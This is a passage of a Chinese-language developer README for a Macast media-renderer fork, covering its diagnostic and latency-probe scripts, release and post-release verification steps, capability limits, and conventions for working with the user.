| `provenance.py` | **谁写了这个仓库里的每一行**：以 fork 点 `1987923`（其父链 = 上游 215 条提交）为界，用 `git blame --line-porcelain` 把每个 `.py` 数成 `upstream` / `vendored` / `mixed` / `ours` 四态，并检查文件头的声明与这个事实是否一致。两个盲区是显式补的，不是留给读者的：① `macast/plugins/**` 是从 **另一个仓库** `xfangfang/Macast-plugins` 粘进来的，本仓库历史里查不到，所以靠 `VENDORED` 常量表而不是 blame（否则会被算成"我们写的"）；② 改名/挪位置的文件同样丢 blame，所以再比对 **blob SHA**（少于 5 行的文件不参与 —— 全世界空文件的 blob 是同一个）。`--check` 报漂移、`--stamp --apply` **只加声明、代码里没有删除路径**（Part 34 守着这句话）、`--json` 给套件。插入位置受 §4.5 约束（插件清单只从顶部**连续**注释块解析，位置歪了插件会静默装不上）。**改完任何 `.py` 的归属，必须同步 `docs/Provenance.md` 的 `provenance-ledger` 行与两张表**，否则 Part 34 红；它需要完整历史，浅克隆会直接报失败而不是假装通过 |
| `check_index_reachability.py` | 把 selfcheck「online plugin index」那段**离仓**跑一遍：不带 GitHub 凭据问三件事（本仓库是否匿名可见 + 公开上游对照组 + jsDelivr 元数据 API），再逐条问 `plugins/info.json` 的固定链接到底服不服务，输出 `INDEX_PRIVATE` / `INDEX_OK` / `INCONCLUSIVE` 之一 + 逐条状态表 + 退出码（0 全部可装，2 有死链，3 判不出）。`--json` 给 CI 用，`--url-only` 只回答单个 URL。为什么单独一个脚本：这是**发版后必做的那一步**（§8）——本地套件全绿只证明条目 == 所指内容，不证明别人拉得到，而私有仓库上的 CDN 缓存会**逐条过期**，没人碰它也会坏 |
| `vlc_sender_sim.py` | **忠实复刻 VLC 状态机**的发送端（含严格 protobuf 语义）。必须等到 `PLAYING` 才算通过 |
| `cast_probe.py` | 手写 TLS/CASTV2 的最小发送端，打逐步日志 |
| `cast_streaming_probe.py` | **把 `macast/plugins/renderer/screen_mirror.py` 的低延迟通道原样打到真电视上**（镜像接收器 `0F5096E8` + OFFER/ANSWER + UDP RTP）。它 `import` 插件本体而不是复刻协议，所以真机通过 = 设置页「电脑投屏」那条路通过。`--live` 采真桌面、`--source` 用文件、`--dump` 留 Annex-B 给 ffprobe。Part 24 只证明字节自洽，**这一步才证明电视认不认**（§4.9） |
| `mse_latency_probe.py` | **浏览器形状的延迟探针，v0.19 那条 −36% 的出处**：起真 `chrome-headless-shell`（本机没有 Google Chrome；Vivaldi headless 会死在 `CVDisplayLinkCreateWithCGDisplay`）、帧抓 `buffered.end` 的 rAF 步长、真采集 + 真编码喂同一管道，逐变体（muxer/GOP/park）输出 lag p50/p95、seek 次数、stall、kbps。`--variants prod,every12,gop2`、`--edges 1.0,0.5`、`--encoder x264|vt`、`--quality` 跑 VMAF。**argv 来自产品本体**（子进程 stub `appdirs` 后调 `build_ffmpeg_command`，只覆写 `-g`/`-movflags`），所以它量的就是上线形状；两个坑写在 docstring 里（`BufferedReader.read(n)` 要换 `read1`，否则粒度读数恒定 166.7 ms；`b''.join` 每块重拼是 O(n²)、会让发送端自己成为瓶颈）。矩阵与被否掉的变体在 `docs/research-screen-mirroring-transport-2026-10.md` §3 |
| `encoder_latency_probe.py` | **编码器在线成本与首帧延迟的探针**（v0.18 的 `-level 42`/`-r` 两条归零 bug 就是它先量出来的形状）：同一段真采集喂 x264 / VideoToolbox，报每编码器的首帧延迟、CPU 核时（按 `cputime` 增量算，不经 `ps`）、产出字节；`--quality` 再跑 VMAF。§4.8 里"0.59 核对 0.41 核 / 首帧约 200 ms"那组数出自它；`dead`/`PRODUCED NOTHING` 分支对应"零帧"那两类真机症状 |
| `sck_capture_probe.py` | **ScreenCaptureKit 形状的可行性探针（v0.21 的取证）**：Mac 上"能不能离开 `-f avfoundation`"的答案在这里 —— 奖品不是像素（avfoundation 能用），而是 macOS 13 上 Apple 给 SCK 的原生 `capturesAudio`，它退役 BlackHole 与 CoreAudio 聚合设备那一整套。四问按序答、打印证据：这套 .venv 能否列内容收帧、帧的形状与节奏（像素格式 / 每行字节 / 帧间隔）、`capturesAudio` 给不给声音与字节率、首帧落后墙钟多少。pyobjc 没有 CoreVideo 绑定是故意的（像素走 ctypes，与插件对 CoreAudio 是同一个习惯）。退出码 0 全答 / 2 无视频帧（TCC 或管线）/ 3 有帧无音频。用法 `env -u PYTHONPATH .venv/bin/python scripts/sck_capture_probe.py --seconds 6 --fps 24 --scale 1920x1080 --play-sound` |
| `sck_pipe_probe.py` | **rawvideo / f32le 两条新管道的契约探针**（v0.21）：打桩套件只能证明 argv 形状，"真 demuxer 认不认"在这里取 —— ① 视频裸流按 SCK 实测 ~23.3/s 到达而输出声称 24，`-use_wallclock_as_timestamps 1` 的对策就是对着它（65 帧 @43 ms = 2.795 s 墙钟：不加时间戳 mux 出 65/24 = 2.708 s、漂 ~87 ms；加了 ≈2.795 s、填成 CFR）；② 音频 float32 PCM 走第二个 `pipe:N` 输入（pass_fds 交接、父进程 Popen 后立刻关自己那份读端 —— 产品将用的形状），时长对齐在两个 20 ms SCK 块容差内。exit 0 = 两问皆答 |
| `smoke_discovery.py` | 真实网络发现验证 |
| `build_macos_arm.sh` / `setup_py2app.py` | 本地 macOS `.app` 构建（CI 用同一套，细节见 `BUILDING.md`） |

**本机造"发送端形态的流"**（不需要手机，用于复现"有声音没画面"这类问题）：

```shell
FF=/opt/homebrew/opt/ffmpeg/bin/ffmpeg      # brew 装了但**不在 PATH**
$FF -y -f lavfi -i testsrc2=size=640x360:rate=25 \
       -f lavfi -i "sine=frequency=440:sample_rate=48000" \
       -t 20 -c:v libx264 -preset ultrafast -pix_fmt yuv420p -c:a aac -shortest /tmp/cast_test.mp4
$FF -y -i /tmp/cast_test.mp4 -c copy -f mpegts /tmp/cast_test.ts
# 再起一个只返回这块 TS 的小 HTTP 服务挂在无扩展名路径上
# （Content-Type: video/mp2t，**必须支持 Range**，否则 mpv 报 loading failed）
.venv/bin/python scripts/vlc_sender_sim.py 127.0.0.1 8009 \
    "http://127.0.0.1:8010/chromecast/1/2/stream"
```

## 7. 文档索引

| 文档 | 内容 |
|---|---|
| `docs/Cast-AirPlay-Testing.md` | **真机验证指南 + 全部已修问题的完整复盘**（三轮："找不到 / 投不上 / 有声音没画面"） |
| `docs/Casting-Suite-Plan.md` | **发送端插件族的规划书**：JustStream 需求矩阵、六个参考项目（mkchromecast / MirrorCast / omacast / UxPlay / Castify / Mac-Screencast）的代码级取证与许可判定、P1-P6 阶段计划与「明确不做」。动镜像/投文件/投浏览器相关代码前先读它 |
| `docs/Casting-Suite.md` | **发送端插件的用户指南**（与上一行分工：规划书给改代码的人，这份给用插件的人）。每个目标的**首次设置流程**：Chromecast 兼容通道 / Chromecast 低延迟（含"上限 8 Mbps 是加密速度不是网络，加密走系统原生 AES；纯 Python 兜底时自动降到 4.5 Mbps 并写明"）/ DLNA 老电视（含"约 4 秒预填是设计如此、现在是 1–8 秒的旋钮，且只在「伪装成文件」形状"与五档回退）/ 浏览器（观看地址与 token 的来历，含"播放页停在直播边缘后 1 秒，这是这一路延迟的下限，0.5–5 秒可调"）；§1.6 说清画质档位、编码器与延迟预算各是多少；本地文件投屏的"自动"在判什么、音轨字幕为什么各有边界；uxplay 与 shairport-sync 的自备安装配方；macOS 屏幕录制权限与 BlackHole 一键设置。**每一节都写明"这条路真机验证到什么程度"** —— 全族只在打桩测试与自家假设备上验证过 |
| `docs/research-screen-mirroring-transport-2026-10.md` | **传输侧研究（2026-10，v0.18 那批改动的取证）**：四种输出形状各自的延迟预算表、Cast Streaming / WebRTC 两条低延迟路的实测边界、无信令服务器的局域网 WebRTC 要付什么代价、MediaMTX 这类现成媒体服务器能不能用、DLNA 直播的延迟来自哪几段、Sunshine/Moonlight 的管线有哪几条能搬过来。**§7「验证不了的部分」是一等公民**：哪些数字来自一手来源、哪些是本机 `[measured]`、哪些只是转述，逐条标了 —— 引它之前先看那一节 |
| `docs/research-screen-mirroring-encoder-2026-10.md` | **编码/加密侧研究（同上）**：不引 pip 依赖拿到硬件速度 AES 的三条路（CommonCrypto / bcrypt / libcrypto，含 ctypes 签名与逐条坑）、VideoToolbox 低延迟调参与它比 `-b:v` 少给三成的实测、HEVC/AV1 硬件编码器与电视到底解什么、ffmpeg `avfoundation` 之外的采集路、屏幕内容的内容自适应编码、RTP 打包与 FEC/重传。§7 同样是"验证不了的部分" |
| `docs/reference-projects-review.md` | 参考项目评估（**接收端**视角）：miraclecast / mkchromecast / AirConnect |
| `docs/Provenance.md` | **来源台账与重写队列**：fork 点与 215 条上游提交、`git blame` 的四态（upstream / vendored / mixed / ours）与它两个盲区（跨仓库粘贴、改名丢 blame）、按域的行数台账（应用本体还有约 3587 行是上游的；"看文件头"会高估成 21623 行，因为上游的头贴在代码早被重写干净的文件上）、`macast/ssdp.py` 里第三方 MIT 作者群那一层、按模块的 8 步重写队列（**完成判据是 `upstream_lines == 0`，可机检**）。**已定边界**：声明只加不减、不在 vendored 文件上署名、不把重写叙述成摆脱 GPLv3 的路径（净室才行）；"去掉 fork 与所有原项目信息"这一半已被拒绝 |
| `docs/Development.md` | 三平台开发与打包 |
| `BUILDING.md` | macOS `.app` 构建（py2app）、产物校验、包体裁剪 |
| `docs/i18n.md` | 翻译流程 |
| `docs/audit-2026-09.md` | 一次安全/健壮性审计记录 |

## 8. 发版流程

版本号有**两处**，必须一致（CI 会校验，不一致直接拒绝发布）：

```shell
macast/.version        # setup.py 用
macast/_version.py     # pyproject(动态版本) 用
```

```shell
# 1) 改两处版本号 + 文档
# 2) 推 main
git add -A && git commit -m "..." && git push origin main
# 3) 打 tag 触发 CI 构建并自动创建 Release
git tag v0.7.11 && git push origin v0.7.11
```

`.github/workflows/build.yml` 会在 tag push 时构建 macOS arm64、Linux x86_64/arm64、
Windows x86_64（**没有 macOS Intel**：`macos-13` 那条队列曾排到 30+ 分钟，`f8b3a15` 起
不再构建，本地要出 Intel 包用 `MACAST_ARCH=x86_64 scripts/setup_py2app.py`），
并在版本一致性校验通过后创建 Release。
产物名形如 `Macast-MacOS-arm64-v<版本>.zip`。

> 也可在 GitHub UI → Actions → Build Macast → Run workflow → `release=true`。

**发版后必做（CI 绿不代表产物能用，见 §4.3）**：

```shell
# 1. 等 CI 跑完，确认 4 个产物都在
gh run list --workflow=build.yml --limit 3
gh api repos/pingod/Macast/releases/tags/v<版本> --jq '.assets[].name'
#    （本机 `/opt/homebrew/bin/gh` 已登录 pingod，scopes 含 repo + workflow；
#     REST API 同样可用：https://api.github.com/repos/pingod/Macast/releases/tags/v<版本>）
# 2. 下载 macOS 产物、替换安装（旧包先移废纸篓，不要硬删）
#    注意下载来的包带 quarantine 属性，需 xattr -dr com.apple.quarantine
# 3. 真正启动并验证
open -a /Applications/Macast.app && sleep 15
lsof -nP -iTCP:8009 -sTCP:LISTEN      # 应有进程
curl -s 'http://127.0.0.1:58880/api?query=status' | head -c 200   # 应返回版本号
dns-sd -B _googlecast._tcp            # 5 秒后应有 Macast-<主机名>
# 4. 只有要测「电脑投屏」时：先重新勾一次录屏授权，再判定镜像坏没坏
```

**替换安装后有三件事会被误读成"新产物坏了"，都是本机 2026-09-23 实测过的：**

- **`open -a /Applications/Macast.app` 可能什么都不启动**（LaunchServices 还认那个刚被移走的
  旧实例）。可靠写法是 `open -n -a /Applications/Macast.app`。
- **不要用 `Contents/MacOS/Macast` 做"包起不起来"的冒烟**（本轮就在这上面栽了一次）：它读的是
  **用户真实的配置目录**，而旧实例还在听 58880 ⇒ 按 §4.2 那条端口回退逻辑，它会挑一个随机端口
  并把 `ApplicationPort` **写进真实设置**、同时重置 USN（本机实测：`58880 → 50116`，
  `macast_setting.json` 当场被改）。要证明包是好的，就直接装到 `/Applications` 再 `open -n -a`；
  万一已经误起了第二个实例，还原顺序是：`kill -2` 掉真实实例（它会自己按内存里的值回写）、
  确认 `keys` 数与 `USN` 没继续变，再把 `ApplicationPort` 改回bound 端口。
  带临时配置目录的启动只有 `scripts/e2e_smoke.py` 会做（§4.9 那条 `appdirs` 打桩）。
- **录屏授权记在"那一个包"的代码身份上，换了包就失效一次**：装完新包第一次镜像会报
  「屏幕采集在 3 秒内没有返回画面」（预览那张图则是「预览采集超时（8 秒）：屏幕可能锁了，
  也可能是这个 Macast 还没有屏幕录制授权 —— …，勾选后重启 Macast」；两条句子都点名门），
  带音频与只带画面两路
  都一样 —— 那是授权，不是链路。**区分"锁屏"与"没授权"的判据**：同一分钟、同一个设备号，
  从 shell 直接跑 `ffmpeg -f avfoundation -i "<屏幕号>:none" -t 3 …` 能写出 1.1 MB H.264
  ⇒ 屏幕没锁，缺的是这个包的授权（shell 那一路有自己的身份）。
  **那个号要先问出来，不要抄**（`ffmpeg -f avfoundation -list_devices true -i ""`，看
  `AVFoundation video devices:` 里 `[N] Capture screen 0` 的 N）：它随机器上插了什么摄像头/
  虚拟相机而变，本机 2026-10-02 是 **2**（`[0] OBS Virtual Camera`、`[1] FaceTime高清相机`、
  `[2] Capture screen 0`），而这一行原先写的 3 在当时是对的。抄一个过期的号会让判据反过来骗人：
  ffmpeg 报 `Invalid device index` 并退出 251，读起来像"采不到画面"，于是把授权问题判成链路问题
  —— 这正是 §4.2 末条（假 ffmpeg 抄虚构格式）的同一族，只是这次抄的是**自己上一台机器**。
  而 `TCC.db` 里
  `kTCCServiceScreenCapture` / `cn.xfangfang.Macast` 那一行**不会替你说话**：本机实测它停在
  `auth_value=2`、`last_modified=13:18:20`，新装的包（13:37）拿不到帧也不会改写这一行。
  修法是让用户在「系统设置 → 隐私与安全性 → 屏幕录制」里把 Macast 关掉再打开（列表里有两个
  就删掉旧的），然后重启 Macast —— **这是系统设置，别代用户点**。完整说法见 `docs/Casting-Suite.md` §5。

**改成了同一版本号重新发布时**：两个方向都走得通 —— `gh release delete v<x>`（默认只删
Release、**保留 git tag**，v0.7.15 之前那 14 个 Release 就是这么清的）可以直接把同名
Release 撤掉；或者不动 Release，把 tag 移到修复提交后强推
（`git tag -f v<x> && git push -f origin v<x>`），CI 会用同名文件**替换** release 里的产物。
用 digest 对比确认真的换了：

```shell
# GET /releases/tags/v<x> 里每个 asset 的 digest 字段
```

## 9. 当前能力边界（别当成 bug）

| 能力 | 状态 |
|---|---|
| DLNA（SSDP + UPnP）接收 | 完整 |
| Chromecast 接收（Cast v2，URL 投屏） | 可用；**未认证接收端**，Google 官方发送端可能因设备认证失败 |
| AirPlay 视频 URL 投屏 | 可用 |
| AirPlay 音频（RAOP） | 核心未实现，但内置插件 `macast/plugins/protocol/raop.py` 可监督 shairport-sync 接收（见 §4.8） |
| AirPlay 屏幕镜像（这台 Mac 当接收端） | 核心未实现，但内置协议插件 `macast/plugins/protocol/airplay_mirror.py` 可监督 **uxplay** 接收 iPhone / 另一台 Mac 的镜像（见 §4.8）。**旧结论「需要 FairPlay 解密，不打算做」是过时的**：AirPlay 2 Legacy 的镜像流是 **AES-128-CTR**，密钥从 pair-setup/verify 协商出的材料推出，uxplay 已实现配对（`/pair-setup` ed25519，密钥落 `~/.uxplay.pem`），**没有任何需要破解的东西**。真正的代价是 macOS 既没有 Homebrew formula 也没有官方二进制，得用户自己编译；Apple 哪天砍掉 Legacy 会**静默失效**。一期让 uxplay 自己开窗渲染，`-vrtp → mpv` 统一渲染留在二期 |
| DRM 内容 | **不可能支持**（受保护 app 镜像出来本来就是黑屏） |
| 插件 | 支持启用/停用/卸载/安装（**热生效，不重启**）；卸载进 `.trash/` 可恢复 |
| 内置插件（第一方） | `macast/plugins/` 下 15 个（6 个来自上游合集 vendored + 9 个本 fork 自研）：yt-dlp 下载/边下边播、外部播放器、小窗+壁纸、自动化钩子、Chromecast 中继、AirPlay 音频（RAOP）、屏幕镜像（三平台 → Chromecast、**没有 Google 栈的老电视（DLNA，伪装成文件，五档兼容档位 + 档位自动回退）**、**或任意浏览器打开一个网址**；Chromecast 有**两条通道**：兼容的 LOAD/mpegts 与**实验性 Cast Streaming 低延迟**（不走 HTTP/LOAD，设备拒绝就自动回落；**加密走系统原生 AES-128-CTR**（ctypes，无新依赖）⇒ 上限 8 Mbps，拿不到任何 OS 后端时才退回纯 Python 密钥流并自动降到 4.5 Mbps、页面写明"已自动降级"；**本通道无声音**（设备不认它时自动回落到上面那条有声音的通道）、**未经真电视验证**）；画质四档 + 多显示器 + 指针开关 + macOS VideoToolbox（`auto` 探测到有硬件就用它）；**这一族的控制面自 v0.11 起全在设置页的「电脑投屏」tab，v0.12 起菜单栏只剩通知**（Part 36 守着）；系统音频 mac 有**一键辅助安装 BlackHole**（v0.7：进度页 + 指名失败步骤 + 残留记录/未重载 coreaudiod 两类根因；v0.12 起控制台分得清「已启用」与「有声音进来」）、Linux 走 pulse monitor、Windows 仅画面）、**本地文件投屏（磁盘上的文件/文件夹/播放列表 → Chromecast 或 DLNA 电视：能原生解码就按字节直供（Range/206，远端自己暂停拖动），否则 ffmpeg 边播边转（会增长的临时文件）；音轨选择 + 音画同步偏移 + 字幕（Cast 走 WebVTT、转码走 libass 烧制）；自动连播、被抢占后看门狗重投（最多 3 次）、停止发 QUIT_APP、只投系统声音的音频档）**、**AirPlay 镜像接收（监督 uxplay，让 iPhone 把屏幕镜像到这台 Mac；uxplay 要用户自己编译）**。**安装只有手动这一条路**（§4.6：仓库保持私有，设置页的「可安装」卡片在别人机器上拉不到索引）|
| 端到端回归 | `scripts/e2e_smoke.py`（33 条，唯一跑真应用的检查）—— 但它会在本机起第二个 Macast 约 30 秒，局域网电视会短暂看到 `Macast E2E Smoke`，**所以不进套件、只在发版前手动跑** |
| 网页投屏入口 | `GET /api?query=cast&url=<绝对地址>&token=<令牌>`（脚本 / 快捷指令 / 书签，绕开 DLNA 发现）；令牌常驻并显示在设置页 |

## 10. 与用户协作的约定（这个仓库的历史教训）

- **不要为了验证去改用户的真实配置**：所有涉及设置的测试用临时 `SETTING_DIR` +
  临时 `setting_path`，测试完还原。（曾因此被用户明确纠正。）
- **改前端（`macast/xml/setting.html`）要用真浏览器验收，三档宽度各看一遍**：
  起一个临时配置目录 + 错开端口的实例（**绝对不碰用户 58880 上那个**），
  窄 / 中 / 宽各截一次图。深色模式的弹层问题就是这类只在真截图里现形的缺陷
  —— Part 44 能守住数字与拼写，守不住"白底压白字"。（另记：`load_xml` 缓存模板，
  改完必须重启实例才生效，见 §4.2。）
- **明确区分"发送端问题"和"我们的问题"再动手**：这个项目里多次出现"用户报我们的 bug，
  实际是发送端行为"，先拿证据（日志/事件/源码）再改代码。
- **破坏性操作要可逆**：删插件用 `mv` 到 `.trash/`；删除/覆盖用户文件前先备份。
- **提交前自查暂存内容**，别夹带构建产物/密钥/`macast.log`。
